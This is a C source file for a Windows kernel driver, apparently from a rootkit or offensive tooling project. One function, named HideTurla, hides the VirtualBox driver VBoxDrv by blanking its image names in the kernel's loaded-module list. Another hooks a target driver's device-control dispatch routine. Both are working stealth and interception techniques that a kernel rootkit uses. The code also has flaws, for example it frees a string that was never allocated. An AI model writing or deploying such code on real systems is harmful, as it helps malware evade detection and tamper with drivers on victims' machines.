#include "Driver.h"

/// <summary>
/// Hides the turla driver
/// </summary>
NTSTATUS HideTurla()
{
    NTSTATUS        Status = STATUS_SUCCESS;
    UNICODE_STRING	TurlaName;
    PDRIVER_OBJECT  Turla;

    RtlInitUnicodeString(&TurlaName, L"\\Driver\\VBoxDrv");

    ObReferenceObjectByName(&TurlaName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID) &Turla);

    if (Turla)
    {
        const PKLDR_DATA_TABLE_ENTRY DriverSection = Turla->DriverSection;

        if (DriverSection)
        {
            DriverSection->FullImageName.Buffer[0] = L'\0';
            DriverSection->FullImageName.Length = 0;
            DriverSection->FullImageName.MaximumLength = 0;

            DriverSection->BaseImageName.Buffer[0] = L'\0';
            DriverSection->BaseImageName.Length = 0;
            DriverSection->BaseImageName.MaximumLength = 0;
        }
        else
        {
            Status = STATUS_UNSUCCESSFUL;
        }

        ObDereferenceObject(Turla);
    }
    else
    {
        Status = STATUS_NOT_FOUND;
    }

    RtlFreeUnicodeString(&TurlaName);

    return Status;
}

// Hook the IRP_MJ_DEVICE_CONTROL routine of a target device
NTSTATUS HookDriver(IN PWCHAR targetDeviceName)
{
    NTSTATUS status = STATUS_SUCCESS;

    UNICODE_STRING deviceName = { 0 };
    PFILE_OBJECT pFileObj = NULL;
    PDEVICE_OBJECT pDevObj = NULL;

    RtlInitUnicodeString(&deviceName, targetDeviceName);

    status = IoGetDeviceObjectPointer(&deviceName, FILE_READ_DATA, &pFileObj, &pDevObj);

    if (!NT_SUCCESS(status))
        return status;

    g_HookCtx.pDrvObj = pDevObj->DriverObject;
    g_HookCtx.pFileObj = pFileObj;

    g_HookCtx.pOldHandler = g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HookedDeviceControl;

    //g_HookCtx.pOldHandler = (PDRIVER_DISPATCH)InterlockedExchange64(
    //    (PLONG64)&g_HookCtx.pDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL],
    //    (LONG64)&HookedDeviceControl);

    g_HookCtx.IsHooked = TRUE;

    return status;
}

typedef struct _HOOK_DRIVER_CONTEXT
{
    PDRIVER_OBJECT pDrvObj;
    PFILE_OBJECT pFileObj;
    PDRIVER_DISPATCH pOldHandler; // Original IRP handler
    BOOLEAN IsHooked;

} HOOK_DRIVER_CONTEXT, *PHOOK_DRIVER_CONTEXT;